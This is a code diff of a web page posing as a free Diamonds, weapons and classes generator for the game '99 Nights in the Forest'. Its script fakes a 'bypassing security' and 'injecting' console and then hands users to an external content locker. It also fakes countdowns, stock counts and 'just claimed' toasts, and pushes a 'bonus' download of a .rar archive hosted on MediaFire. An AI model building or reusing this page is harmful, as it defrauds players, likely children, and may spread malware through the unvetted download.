@@ -1,244 +1,554 @@
-
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>99 Nights in the Forest</title>
-    <!-- Open Graph / Facebook -->
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://stealabrainrot.com/">
-    <meta property="og:title" content="99 Nights in the Forest">
-    <meta property="og:description" content="Claim your class now!">
-    <meta property="og:image"
-        content="https://i.postimg.cc/ZqcVrdtV/Screenshot-2025-11-15-at-15-59-52-removebg-preview.png">
-    <!-- Twitter -->
-    <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://stealabrainrot.com/">
-    <meta property="twitter:title" content="99 Nights in the Forest">
-    <meta property="twitter:description" content="Claim your class now!">
-    <meta property="twitter:image"
-        content="https://i.postimg.cc/ZqcVrdtV/Screenshot-2025-11-15-at-15-59-52-removebg-preview.png">
-    <link href="https://fonts.googleapis.com/css2?family=Fredoka+One:wght@400&display=swap" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
-    <script src="https://cdn.tailwindcss.com"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>99 Nights in the Forest - Final Enhanced</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Fredoka+One&family=Poppins:wght@400;600;700&display=swap"
-        rel="stylesheet">
-    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* --- ORIGINAL & ENHANCED CSS --- */
+        body {
+            background-color: #0d1117;
+            background-image: url('https://images.pexels.com/photos/957024/forest-trees-perspective-dark-957024.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            font-family: 'Poppins', sans-serif;
+            overflow-x: hidden;
+        }
+        #flying-items-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+        .flying-item {
+            position: absolute;
+            bottom: -150px;
+            opacity: 0.15;
+            animation: fly 10s linear infinite;
+        }
+        @keyframes fly {
+            0% { transform: translateY(0) rotate(0deg); opacity: 0.15; }
+            100% { transform: translateY(-120vh) rotate(360deg); opacity: 0; }
+        }
+        .blocky-bg {
+            background-color: rgba(13, 17, 23, 0.8);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .game-logo {
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto 1rem;
+        }
+        .rainbow-banner-text {
+            font-size: 1.5rem;
+            font-weight: 700;
+            background: linear-gradient(90deg, #ff5e5e, #ffea5e, #5effae, #5e9eff, #ff5ef7, #ff5e5e);
+            background-size: 400% 400%;
+            animation: rainbow-banner-anim 6s linear infinite;
+            color: transparent;
+            -webkit-background-clip: text;
+            background-clip: text;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+        }
+        @keyframes rainbow-banner-anim {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 100% 50%; }
+        }
+        .category-title {
+            font-size: 1.75rem;
+            font-weight: 600;
+            color: #fff;
+            margin-bottom: 1.5rem;
+            text-align: center;
+        }
+        .pet-row {
+            background-color: rgba(30, 36, 46, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: transform 0.2s ease, background-color 0.2s ease, box-shadow 0.2s ease;
+        }
+        .pet-row:hover {
+            background-color: rgba(40, 46, 56, 0.9);
+            transform: scale(1.03);
+            box-shadow: 0 0 15px rgba(104, 200, 255, 0.5);
+        }
+        .item-title-glow {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #fff;
+            text-shadow: 0 0 8px rgba(104, 200, 255, 0.7);
+        }
+        .claim-pill {
+            background-color: #2ea043;
+            color: white;
+            padding: 0.5rem 1.5rem;
+            border-radius: 9999px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
+        .claim-pill:hover {
+            background-color: #3bb543;
+        }
+        .username-modal-backdrop {
+            position: fixed; inset: 0; background-color: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(5px); z-index: 50; display: flex; align-items: center; justify-content: center;
+        }
+        .username-modal {
+            background: #161b22; border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 1rem;
+            padding: 2rem; width: min(400px, 90%); text-align: center; position: relative;
+        }
+        .username-modal-close {
+            position: absolute; top: 10px; right: 15px; background: none; border: none;
+            color: #888; font-size: 1.5rem; cursor: pointer;
+        }
+        .username-modal-title { font-size: 1.5rem; font-weight: 600; color: #fff; }
+        .username-modal-sub { color: #aaa; margin-bottom: 1rem; }
+        .username-modal-input {
+            width: 100%; padding: 0.75rem; background: #0d1117; border: 1px solid #30363d;
+            border-radius: 0.5rem; color: #fff; margin-bottom: 0.5rem; text-align: center;
+        }
+        .username-modal-error { color: #f85149; margin-bottom: 1rem; min-height: 1.2rem; }
+        .username-modal-btn {
+            width: 100%; padding: 0.75rem; background-color: #2ea043; color: white; border: none;
+            border-radius: 0.5rem; font-weight: 600; cursor: pointer;
+        }
+        .modal-content {
+            background-color: #161b22; border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .pulse-title { animation: pulse-white 1.5s infinite; }
+        @keyframes pulse-white { 50% { opacity: 0.6; } }
+        .progress-bar { background-color: #0d1117; border-radius: 9999px; overflow: hidden; }
+        .progress-fill {
+            background: linear-gradient(90deg, #2ea043, #68c8ff); color: #fff; font-weight: 600;
+            transition: width 0.5s ease;
+        }
+        .green-claim-button {
+            background-color: #2ea043; border-radius: 0.5rem; font-weight: 700; color: white;
+            transition: background-color 0.2s ease;
+        }
+        .green-claim-button:hover { background-color: #3bb543; }
+        .countdown-timer {
+            text-align: center; margin-top: 1rem; background-color: rgba(255, 0, 0, 0.2);
+            border: 1px solid rgba(255, 0, 0, 0.5); border-radius: 0.5rem; padding: 0.5rem;
+            max-width: 300px; margin-left: auto; margin-right: auto; margin-bottom: 1.5rem;
+        }
+        .countdown-text {
+            color: #ffcccc; font-weight: 500; font-family: 'Inter', sans-serif;
+        }
+        #countdown {
+            color: #fff; font-weight: 700; letter-spacing: 2px;
+        }
+        .stock-info {
+            font-size: 0.75rem; color: #aeb8c5; margin-top: 4px;
+        }
+        .stock-bar {
+            width: 60px; height: 6px; background-color: #333; border-radius: 3px;
+            overflow: hidden; display: inline-block; margin-left: 5px;
+        }
+        .stock-bar-fill {
+            height: 100%; background: linear-gradient(90deg, #ff5e5e, #ffea5e); border-radius: 3px;
+        }
+        .social-proof-toast {
+            position: fixed; bottom: 20px; left: 20px; background-color: rgba(13, 17, 23, 0.9);
+            backdrop-filter: blur(8px); color: #fff; padding: 12px 20px; border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.1); z-index: 100; display: flex;
+            align-items: center; opacity: 0; transform: translateY(20px);
+            transition: opacity 0.5s ease, transform 0.5s ease; font-size: 0.9rem;
+        }
+        .social-proof-toast.show {
+            opacity: 1; transform: translateY(0);
+        }
+        .toast-img {
+            width: 32px; height: 32px; margin-right: 12px; object-fit: contain;
+        }
+        .generator-console {
+            margin-top: 1rem; padding: 0.75rem; background-color: #0d1117; border: 1px solid #30363d;
+            border-radius: 0.5rem; height: 120px; overflow-y: auto; text-align: left;
+            font-family: 'Courier New', Courier, monospace; font-size: 0.8rem; color: #aeb8c5;
+        }
+        .console-line {
+            margin-bottom: 4px;
+        }
+        .pulse-green {
+            animation: pulse-green-anim 2s infinite;
+        }
+        @keyframes pulse-green-anim {
+            0% { box-shadow: 0 0 0 0 rgba(46, 160, 67, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(46, 160, 67, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(46, 160, 67, 0); }
+        }
+        .footer {
+            text-align: center; padding: 2rem 1rem; color: #888; font-size: 0.8rem;
+        }
+        .footer a {
+            color: #aaa; text-decoration: none; margin: 0 10px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+
 </head>
+<body class="bg-gray-900 text-white">
+    
+    <div id="flying-items-container"></div>
 
-<body>
-    <div id="ios-popup" style="display:none">
-        <div class="popup-background"></div>
-        <div class="popup">
-            <div class="gif-container">
-                <img src="https://www9.0zz0.com/2024/04/06/13/548511907.gif" alt="Instructions GIF"
-                    class="instruction-gif">
-            </div>
-            <p class="instruction-text">Please Click On The Three Dots At The Top And Open in Browser To to Claim your
-                Class.</p>
-        </div>
-    </div>
 
-    <div id="normal-page" style="display:none">
-        <div id="floating-items-container"></div>
+    <div id="normal-page">
         <div class="container mx-auto px-4 py-8">
             <section class="mb-16" id="pets">
                 <div class="blocky-bg rounded-3xl p-6 md:p-10 max-w-2xl mx-auto">
-                    <div style="display: flex; justify-content: center; margin-bottom: 1.5rem;">
-                        <div class="rainbow-banner" style="margin: 0 auto;">
-                            <span class="rainbow-banner-text"
-                                style="background: linear-gradient(90deg,);background-size: 400% 400%;animation: rainbow-banner-anim 6s linear infinite;color: #FFFFFF;text-shadow: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;opacity: 1;">CLAIM
-                                YOUR CLASS NOW</span>
+                    <div class="game-logo-container">
+                        <!-- UPDATED GAME ICON IMAGE -->
+                        <img src="https://static.wikia.nocookie.net/99-nights-in-the-forest/images/c/c4/Gamethumbnail.png" alt="99 Nights in the Forest" class="game-logo">
+                    </div>
+                    <div style="display: flex; justify-content: center; margin-bottom: 0.5rem;">
+                        <div class="rainbow-banner">
+                            <span class="rainbow-banner-text">CLAIM YOUR FOREST REWARDS</span>
                         </div>
                     </div>
-                    <ul class="grid-container">
-
- <li
-                            class="pet-row flex flex-row items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
-                            <div class="bar-title-secret">Diamonds</div>
-                            <div class="pet-left-content">
-                                <div class="pet-img-bg flex items-center justify-center rounded-xl">
-                                    <img src="https://i.postimg.cc/TPZSKFqG/20-diamonds.webp" alt="20 Diamonds"
-                                        style="max-width: 100%; max-height: 100%; width: auto; height: auto; object-fit: contain;" />
-                                </div>
-                                <div class="pet-title-container">
-                                    <span class="pet-title item-title-glow">20 Diamonds</span>
-                                </div>
-                            </div>
-                            <span class="claim-pill" onclick="openUsernameModal('20 Diamonds')">Claim</span>
-                        </li>
-
-                        <li
-                            class="pet-row flex flex-row items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
-                            <div class="bar-title-secret">Diamonds</div>
-                            <div class="pet-left-content">
-                                <div class="pet-img-bg flex items-center justify-center rounded-xl">
-                                    <img src="https://i.postimg.cc/xdW7XhyJ/100-diamonds.png" alt="100 Diamonds"
-                                        style="max-width: 100%; max-height: 100%; width: auto; height: auto; object-fit: contain;" />
-                                </div>
-                                <div class="pet-title-container">
-                                    <span class="pet-title item-title-glow">100 Diamonds</span>
-                                </div>
-                            </div>
-                            <span class="claim-pill" onclick="openUsernameModal('100 Diamonds')">Claim</span>
-                        </li>
-
-                        <li
-                            class="pet-row flex flex-row items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
-                            <div class="bar-title-secret">Diamonds</div>
-                            <div class="pet-left-content">
-                                <div class="pet-img-bg flex items-center justify-center rounded-xl">
-                                    <img src="https://i.postimg.cc/5tZGXTqH/250-diamonds.png" alt="250 Diamonds"
-                                        style="max-width: 100%; max-height: 100%; width: auto; height: auto; object-fit: contain;" />
-                                </div>
-                                <div class="pet-title-container">
-                                    <span class="pet-title item-title-glow">250 Diamonds</span>
-                                </div>
-                            </div>
-                            <span class="claim-pill" onclick="openUsernameModal('250 Diamonds')">Claim</span>
-                        </li>
-
-                        <li
-                            class="pet-row flex flex-row items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
-                            <div class="bar-title-secret">Diamonds</div>
-                            <div class="pet-left-content">
-                                <div class="pet-img-bg flex items-center justify-center rounded-xl">
-                                    <img src="https://i.postimg.cc/xdW7XhyN/700-diamonds.png" alt="700 Diamonds"
-                                        style="max-width: 100%; max-height: 100%; width: auto; height: auto; object-fit: contain;" />
-                                </div>
-                                <div class="pet-title-container">
-                                    <span class="pet-title item-title-glow">700 Diamonds</span>
-                                </div>
-                            </div>
-                            <span class="claim-pill" onclick="openUsernameModal('700 Diamonds')">Claim</span>
-                        </li>
-
-
-                      
-                        <li
-                            class="pet-row engineer-row flex flex-row items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
-                            <div class="bar-title-secret">Class</div>
-                            <div class="pet-left-content">
-                                <div class="pet-img-bg flex items-center justify-center rounded-xl">
-                                    <img src="https://i.postimg.cc/kXnKnWTw/Engineer-s-icon-removebg-preview.png"
-                                        alt="Engineer"
-                                        style="max-width: 100%; max-height: 100%; width: auto; height: auto; object-fit: contain;" />
-                                </div>
-                                <div class="pet-title-container">
-                                    <span class="pet-title item-title-glow">Engineer</span>
-                                </div>
-                            </div>
-                            <span class="claim-pill" onclick="openUsernameModal('Engineer')">Claim</span>
-                        </li>
-                        <li
-                            class="pet-row flex flex-row items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
-                            <div class="bar-title-secret">Class</div>
-                            <div class="pet-left-content">
-                                <div class="pet-img-bg flex items-center justify-center rounded-xl">
-                                    <img src="https://i.postimg.cc/xCMZM5t1/1762521681041.png" alt="Vampire"
-                                        style="max-width: 100%; max-height: 100%; width: auto; height: auto; object-fit: contain;" />
-                                </div>
-                                <div class="pet-title-container">
-                                    <span class="pet-title item-title-glow">Vampire</span>
-                                </div>
-                            </div>
-                            <span class="claim-pill" onclick="openUsernameModal('Vampire')">Claim</span>
-                        </li>
-
-                        <li
-                            class="pet-row flex flex-row items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
-                            <div class="bar-title-secret">Class</div>
-                            <div class="pet-left-content">
-                                <div class="pet-img-bg flex items-center justify-center rounded-xl">
-                                    <img src="https://i.postimg.cc/RFKYKdXc/cyborg-lp.png" alt="Cyborg"
-                                        style="max-width: 100%; max-height: 100%; width: auto; height: auto; object-fit: contain;" />
-                                </div>
-                                <div class="pet-title-container">
-                                    <span class="pet-title item-title-glow">Cyborg</span>
-                                </div>
-                            </div>
-                            <span class="claim-pill" onclick="openUsernameModal('Cyborg')">Claim</span>
-                        </li>
-
-                        <li
-                            class="pet-row flex flex-row items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
-                            <div class="bar-title-secret">Class</div>
-                            <div class="pet-left-content">
-                                <div class="pet-img-bg flex items-center justify-center rounded-xl">
-                                    <img src="https://i.postimg.cc/760R09mS/pyromanyak-lp.png" alt="Pyromaniac"
-                                        style="max-width: 100%; max-height: 100%; width: auto; height: auto; object-fit: contain;" />
-                                </div>
-                                <div class="pet-title-container">
-                                    <span class="pet-title item-title-glow">Pyromaniac</span>
-                                </div>
-                            </div>
-                            <span class="claim-pill" onclick="openUsernameModal('Pyromaniac')">Claim</span>
-                        </li>
-
-                        <li
-                            class="pet-row flex flex-row items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
-                            <div class="bar-title-secret">Class</div>
-                            <div class="pet-left-content">
-                                <div class="pet-img-bg flex items-center justify-center rounded-xl">
-                                    <img src="https://i.postimg.cc/bJk5kg3b/assaing-lppng.png" alt="Assassin"
-                                        style="max-width: 100%; max-height: 100%; width: auto; height: auto; object-fit: contain;" />
-                                </div>
-                                <div class="pet-title-container">
-                                    <span class="pet-title item-title-glow">Assassin</span>
-                                </div>
-                            </div>
-                            <span class="claim-pill" onclick="openUsernameModal('Assassin')">Claim</span>
-                        </li>
-
-                       
-                    </ul>
+                    <div class="countdown-timer">
+                        <span class="countdown-text">Offer ends in: <span id="countdown">14:59</span></span>
+                    </div>
+                    <div id="items-container"></div>
                 </div>
             </section>
         </div>
     </div>
 
-    <!-- Username Modal -->
+
     <div id="username-modal-backdrop" class="username-modal-backdrop" style="display:none;">
         <div class="username-modal">
-            <button class="username-modal-close" id="username-modal-close">&times;</button>
+            <button class="username-modal-close" id="username-modal-close">×</button>
             <div class="username-modal-title">Enter Your Username</div>
-            <div class="username-modal-sub">Please enter your username to claim your class.</div>
-            <input class="username-modal-input" id="username-modal-input" placeholder="Your Username" type="text" />
+            <div class="username-modal-sub">Please enter your username to claim your rewards.</div>
+            <input class="username-modal-input" id="username-modal-input" placeholder="Your Username" type="text">
             <div class="username-modal-error" id="username-modal-error"></div>
             <button class="username-modal-btn" id="username-modal-btn">Submit</button>
         </div>
     </div>
 
-    <!-- Generator Modal -->
+
     <div id="generator-modal" class="fixed inset-0 flex items-center justify-center bg-black bg-opacity-60 z-50 hidden">
         <div class="modal-content p-8 rounded-2xl max-w-md w-full text-center relative">
             <div id="generator-title" class="text-2xl font-bold mb-4 pulse-title">Connecting...</div>
-            <img id="loading-item-img" src="" alt="Item" class="mx-auto mb-4 w-24 h-24 object-contain"
-                style="display:none;">
+            <img id="loading-item-img" src="" alt="Item" class="mx-auto mb-4 w-24 h-24 object-contain" style="display:none;">
             <div class="progress-bar mb-4">
-                <div id="progress-fill" class="progress-fill" style="width:0%">0%</div>
+                <div id="progress-fill" class="progress-fill text-center" style="width:0%">0%</div>
             </div>
-            <div id="game-tip" class="mb-4 text-lg text-dark"></div>
-            <button id="verify-btn" class="green-claim-button w-full py-3 text-xl hidden">Verify & Claim</button>
+            <div id="generator-console" class="generator-console"></div>
+            <div id="game-tip" class="mb-4 text-lg text-gray-400"></div>
+            <button id="verify-btn" class="green-claim-button w-full py-3 text-xl hidden pulse-green">COMPLETE VERIFICATION NOW</button>
         </div>
     </div>
 
-    <!-- Winner Popup -->
-    <div id="winner-popup"
-        style="display:none; position:fixed; left:50%; bottom:32px; transform:translateX(-50%); z-index:9999; min-width:320px; max-width:90vw; background:rgba(0,0,0,0.7); color:#fff; font-family:'Fredoka One',cursive; font-size:0.98rem; border-radius:2.2rem; box-shadow:0 4px 16px #0008; padding:0.5rem 1.5rem; pointer-events:none; border:2px solid #43d13b; height:auto; align-items:center; gap:12px; transition:opacity 0.3s ease;">
-        <div id="winner-popup-icon" style="flex-shrink:0;"></div>
-        <span id="winner-popup-content" style="text-align:left;display:block;flex:1;"></span>
+
+    <div id="download-popup-backdrop" class="username-modal-backdrop" style="display:none;">
+        <div class="username-modal">
+            <button class="username-modal-close" id="download-popup-close">×</button>
+            <div class="username-modal-title">Download Your Bonus!</div>
+            <div class="username-modal-sub">Thank you for visiting! Here is a special bonus for you.</div>
+            <button class="username-modal-btn" id="download-btn">Download Now</button>
+        </div>
     </div>
+
+
+    <div id="social-proof-toast" class="social-proof-toast">
+        <img id="toast-item-img" src="" alt="item" class="toast-img">
+        <p id="toast-text"></p>
+    </div>
+
+
+    <footer class="footer">
+        <p>&copy; 2025 99 Nights in the Forest. All Rights Reserved.</p>
+        <p>
+            <a href="#">Terms of Service</a> | <a href="#">Privacy Policy</a>
+        </p>
+    </footer>
+
 
 <script type="text/javascript">
     var hIDrS_MLz_DgZgAc={"it":4580099,"key":"0517c"};
 </script>
 <script src="https://duw03nk63ml3f.cloudfront.net/6eaacd0.js"></script>
-    <script src="script.js"></script>
-</body>
 
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            
+            // --- ALL UPDATED IMAGE URLS AND NAMES ARE HERE ---
+            const itemCategories = {
+              
+              
+                     "💎 Diamonds": [
+                    { name: "700 Diamonds", image: "https://bloxcart.com/_next/image/?url=https%3A%2F%2Fcdn.shopify.com%2Fs%2Ffiles%2F1%2F0815%2F2068%2F9482%2Ffiles%2Fm9XyXTM.png%3Fv%3D1749316957%3Fformat%3Dwebp&w=1920&q=75" },
+                    { name: "250 Diamonds", image: "https://bloxcart.com/_next/image/?url=https%3A%2F%2Fcdn.shopify.com%2Fs%2Ffiles%2F1%2F0815%2F2068%2F9482%2Ffiles%2FpElfPzr.png%3Fv%3D1749316944%3Fformat%3Dwebp&w=1920&q=75" },
+                    { name: "100 Diamonds", image: "https://bloxcart.com/_next/image/?url=https%3A%2F%2Fcdn.shopify.com%2Fs%2Ffiles%2F1%2F0815%2F2068%2F9482%2Ffiles%2FXhAzes5.png%3Fv%3D1749316924%3Fformat%3Dwebp&w=1920&q=75" }
+                ],
+              
+                "⚔️ Weapons": [
+                    { name: "One Hit EXE", image: "https://i.ibb.co/5hsfczJk/image-removebg-preview-1.png" },
+                    { name: "THE Chainsaw", image: "https://static.wikia.nocookie.net/99-nights-in-the-forest/images/8/82/Chainsawcrop.png" },
+                    { name: "Laser Cannon", image: "https://static.wikia.nocookie.net/99-nights-in-the-forest/images/a/a3/Laser_Cannon.png" },
+                    { name: "Strong Axe", image: "https://static.wikia.nocookie.net/99-nights-in-the-forest/images/d/d5/Strong_axe.png" },
+                    { name: "Infernal Sword", image: "https://static.wikia.nocookie.net/99-nights-in-the-forest/images/0/0c/Infernal_sword.png" }
+                ],
+                "✨ Classes": [
+                    { name: "Cyborg Class", image: "https://i.postimg.cc/7PpP2Y9V/Cyborgclass.webp" },
+                    { name: "Pyromaniac Class", image: "https://i.postimg.cc/g2zCwfCs/Pyromancerclass.webp" },
+                    { name: "Big Game Hunter", image: "https://i.postimg.cc/Sxgwcgqh/Big-Game-Masterclass.webp" }
+                ]
+            
+            };
+
+
+            const tips = [ "Tip: Use cover during intense fights!", "Tip: Always keep an eye on your ammo!", "Tip: Teamwork makes the dream work!", "Tip: Explore the map for hidden secrets!"];
+            let selectedItem = null;
+
+
+            const itemsContainer = document.getElementById('items-container');
+            const usernameModal = document.getElementById('username-modal-backdrop');
+            const usernameInput = document.getElementById('username-modal-input');
+            const usernameError = document.getElementById('username-modal-error');
+            const submitBtn = document.getElementById('username-modal-btn');
+            const closeModalBtn = document.getElementById('username-modal-close');
+            const generatorModal = document.getElementById('generator-modal');
+            
+            const downloadPopup = document.getElementById('download-popup-backdrop');
+            const downloadBtn = document.getElementById('download-btn');
+            const closeDownloadPopupBtn = document.getElementById('download-popup-close');
+
+
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            function playClickSound() {
+                if (audioContext.state === 'suspended') { audioContext.resume(); }
+                const oscillator = audioContext.createOscillator();
+                const gainNode = audioContext.createGain();
+                oscillator.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                oscillator.type = 'sine';
+                oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
+                oscillator.frequency.exponentialRampToValueAtTime(400, audioContext.currentTime + 0.1);
+                gainNode.gain.setValueAtTime(0.2, audioContext.currentTime);
+                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.1);
+                oscillator.start(audioContext.currentTime);
+                oscillator.stop(audioContext.currentTime + 0.1);
+            }
+
+
+            function showLocker() {
+                if (typeof _Ri === 'function') {
+                    _Ri();
+                } else {
+                    console.error('Locker trigger function _Ri() not found.');
+                }
+            }
+
+
+            function openUsernameModal(itemName, itemImage) {
+                playClickSound();
+                selectedItem = { name: itemName, image: itemImage };
+                usernameModal.style.display = 'flex';
+                usernameInput.value = '';
+                usernameError.textContent = '';
+            }
+
+
+            function closeUsernameModal() {
+                playClickSound();
+                usernameModal.style.display = 'none';
+            }
+
+
+            function startGenerator() {
+                closeUsernameModal();
+                generatorModal.classList.remove('hidden');
+                const title = document.getElementById('generator-title');
+                const itemImg = document.getElementById('loading-item-img');
+                const progressFill = document.getElementById('progress-fill');
+                const gameTip = document.getElementById('game-tip');
+                const verifyBtn = document.getElementById('verify-btn');
+                const consoleLog = document.getElementById('generator-console');
+
+                itemImg.src = selectedItem.image;
+                itemImg.style.display = 'block';
+                verifyBtn.classList.add('hidden');
+                consoleLog.innerHTML = '';
+
+                let progress = 0;
+                
+                const consoleMessages = [
+                    { delay: 500, progress: 15, text: `Connecting to ${usernameInput.value.trim()}`, log: "Initializing connection to game server..." },
+                    { delay: 1500, progress: 45, text: `Authenticating User...`, log: "[OK] Bypassing security protocols..." },
+                    { delay: 1500, progress: 75, text: `Generating ${selectedItem.name}...`, log: `Authenticating user: ${usernameInput.value.trim()}...` },
+                    { delay: 1000, progress: 90, text: `Generating ${selectedItem.name}...`, log: `[SUCCESS] Injecting ${selectedItem.name} into account...` },
+                    { delay: 1000, progress: 100, text: `Generation Complete!`, log: "Finalizing... Human verification required." }
+                ];
+
+                let cumulativeDelay = 0;
+
+                consoleMessages.forEach(msg => {
+                    cumulativeDelay += msg.delay;
+                    setTimeout(() => {
+                        progress = msg.progress;
+                        progressFill.style.width = `${progress}%`;
+                        progressFill.textContent = `${progress}%`;
+                        title.textContent = msg.text;
+                        consoleLog.innerHTML += `<div class="console-line">${msg.log}</div>`;
+                        consoleLog.scrollTop = consoleLog.scrollHeight;
+                        gameTip.textContent = tips[Math.floor(Math.random() * tips.length)];
+
+                        if (progress === 100) {
+                            verifyBtn.classList.remove('hidden');
+                        }
+                    }, cumulativeDelay);
+                });
+            }
+
+
+            submitBtn.addEventListener('click', () => {
+                playClickSound();
+                const username = usernameInput.value.trim();
+                usernameError.textContent = '';
+                if (!username) {
+                    usernameError.textContent = 'Username cannot be empty.';
+                    return;
+                }
+                startGenerator();
+            });
+            
+            closeModalBtn.addEventListener('click', closeUsernameModal);
+            document.getElementById('verify-btn').addEventListener('click', () => {
+                playClickSound();
+                showLocker();
+            });
+
+            setTimeout(() => {
+                downloadPopup.style.display = 'flex';
+            }, 18000000);
+            closeDownloadPopupBtn.addEventListener('click', () => {
+                playClickSound();
+                downloadPopup.style.display = 'none';
+            });
+            downloadBtn.addEventListener('click', () => {
+                playClickSound();
+                window.location.href = 'https://www.mediafire.com/file/y5s49shs4w3xnrj/99night_diamonds.rar/file';
+            });
+
+            function initializeItems() {
+                for (const category in itemCategories) {
+                    const section = document.createElement('div');
+                    section.className = 'category-section mb-8';
+                    let itemsHtml = '';
+                    itemCategories[category].forEach(item => {
+                        const stockTotal = 100;
+                        const stockClaimed = Math.floor(Math.random() * 15) + 85;
+                        const stockPercentage = (stockClaimed / stockTotal) * 100;
+
+                        itemsHtml += `
+                            <li class="pet-row flex items-center justify-between rounded-2xl shadow-lg px-4 py-3 relative">
+                                <div class="flex items-center flex-grow">
+                                    <div class="pet-img-bg flex items-center justify-center rounded-xl mr-4 flex-shrink-0" style="width:70px;height:70px;background:#68c8ff21;">
+                                        <img src="${item.image}" alt="${item.name}" class="w-16 h-16 object-contain">
+                                    </div>
+                                    <div class="flex-grow">
+                                        <span class="pet-title item-title-glow block">${item.name}</span>
+                                        <div class="stock-info">
+                                            <span>${stockClaimed}/${stockTotal} claimed</span>
+                                            <div class="stock-bar"><div class="stock-bar-fill" style="width: ${stockPercentage}%;"></div></div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <span class="claim-pill ml-4" data-name="${item.name}" data-image="${item.image}">Claim</span>
+                            </li>`;
+                    });
+                    section.innerHTML = `
+                        <h2 class="category-title">${category}</h2>
+                        <ul class="space-y-6">${itemsHtml}</ul>`;
+                    itemsContainer.appendChild(section);
+                }
+                
+                document.querySelectorAll('.claim-pill').forEach(button => {
+                    button.addEventListener('click', (e) => {
+                        const name = e.target.getAttribute('data-name');
+                        const image = e.target.getAttribute('data-image');
+                        openUsernameModal(name, image);
+                    });
+                });
+            }
+
+            function createFlyingItems() {
+                const container = document.getElementById('flying-items-container');
+                const itemsToFly = [
+                    'https://static.wikia.nocookie.net/99-nights-in-the-forest/images/d/d5/Strong_axe.png',
+                    'https://i.postimg.cc/Sxgwcgqh/Big-Game-Masterclass.webp',
+                    'https://bloxcart.com/_next/image/?url=https%3A%2F%2Fcdn.shopify.com%2Fs%2Ffiles%2F1%2F0815%2F2068%2F9482%2Ffiles%2Fm9XyXTM.png%3Fv%3D1749316957%3Fformat%3Dwebp&w=1920&q=75'
+                ];
+                const count = 20; 
+                for (let i = 0; i < count; i++) {
+                    const item = document.createElement('img');
+                    item.src = itemsToFly[Math.floor(Math.random() * itemsToFly.length)];
+                    item.className = 'flying-item';
+                    const size = Math.random() * 80 + 40; 
+                    item.style.width = `${size}px`;
+                    item.style.height = `${size}px`;
+                    item.style.left = `${Math.random() * 100}%`;
+                    item.style.animationDuration = `${Math.random() * 10 + 8}s`; 
+                    item.style.animationDelay = `${Math.random() * 10}s`; 
+                    container.appendChild(item);
+                }
+            }
+
+            function startCountdown() {
+                const countdownElement = document.getElementById('countdown');
+                let time = 14 * 60 + 59;
+                setInterval(() => {
+                    if (time <= 0) return;
+                    time--;
+                    const minutes = Math.floor(time / 60);
+                    let seconds = time % 60;
+                    seconds = seconds < 10 ? '0' + seconds : seconds;
+                    countdownElement.textContent = `${minutes}:${seconds}`;
+                }, 1000);
+            }
+
+            function socialProof() {
+                const toast = document.getElementById('social-proof-toast');
+                const toastText = document.getElementById('toast-text');
+                const toastImg = document.getElementById('toast-item-img');
+                const usernames = ["GamerPro123", "ShadowNinja", "EpicDude", "ForestChamp", "NightHunter", "xX_Slayer_Xx", "MysticBlade"];
+                const allItems = Object.values(itemCategories).flat();
+
+                setInterval(() => {
+                    const randomUser = usernames[Math.floor(Math.random() * usernames.length)];
+                    const randomItem = allItems[Math.floor(Math.random() * allItems.length)];
+                    
+                    toastImg.src = randomItem.image;
+                    toastText.innerHTML = `<b>${randomUser}</b> just claimed <b>${randomItem.name}</b>`;
+                    
+                    toast.classList.add('show');
+                    
+                    setTimeout(() => {
+                        toast.classList.remove('show');
+                    }, 4000);
+                }, 6000);
+            }
+
+            initializeItems();
+            createFlyingItems();
+            startCountdown();
+            socialProof();
